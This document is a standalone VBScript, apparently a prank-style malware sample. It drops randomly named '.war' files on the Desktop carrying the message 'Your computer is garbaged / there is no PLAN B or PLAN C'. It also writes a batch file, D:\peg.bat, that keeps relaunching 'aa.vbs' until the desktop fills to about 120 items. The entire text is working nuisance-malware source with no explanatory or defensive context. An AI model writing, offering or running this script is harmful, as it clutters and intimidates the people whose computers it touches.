Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

For i = 1 To 2
    On Error Resume Next ' Ignore any errors that occur during file creation
    randomFilename = GenerateRandomChars() & ".war"
    filePath = objShell.SpecialFolders("Desktop") & "\" & randomFilename
    Set objFile = objFSO.CreateTextFile(filePath, True)
    objFile.WriteLine "Your computer is garbaged" & vbCrLf & "there is no PLAN B or PLAN C"
    objFile.Close
Next

desktopPath = objShell.SpecialFolders("Desktop")
Set objFolder = objFSO.GetFolder(desktopPath)
fileCount = objFolder.Files.Count
folderCount = objFolder.SubFolders.Count
shortcutCount = 0

For Each objFile In objFolder.Files
    If objFSO.GetExtensionName(objFile.Name) = "lnk" Then
        shortcutCount = shortcutCount + 1
    End If
Next
If Not objFSO.FileExists("D:\peg.bat") Then
    a = shortcutCount + folderCount + fileCount
    b = 120 - a

    batchFilePath = "D:\peg.bat"
    batchContent = "@echo off" & vbCrLf & _
                  "set loop=0" & vbCrLf & _
                  ":loop" & vbCrLf & _
                  "start aa.vbs" & vbCrLf & _
                  "set /a loop=loop+1" & vbCrLf & _
                  "if %loop%==" & b & " goto next" & vbCrLf & _
                  "goto loop" & vbCrLf & _
                  ":next"

    Set objBatchFile = objFSO.CreateTextFile(batchFilePath, True)
    objBatchFile.Write batchContent
    objBatchFile.Close
End If

Function GenerateRandomChars()
    Randomize 
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    randomChars = ""

    For i = 1 To 20
        randomIndex = Int((Len(chars) * Rnd) + 1)
        randomChars = randomChars & Mid(chars, randomIndex, 1)
    Next

    GenerateRandomChars = randomChars
End Function
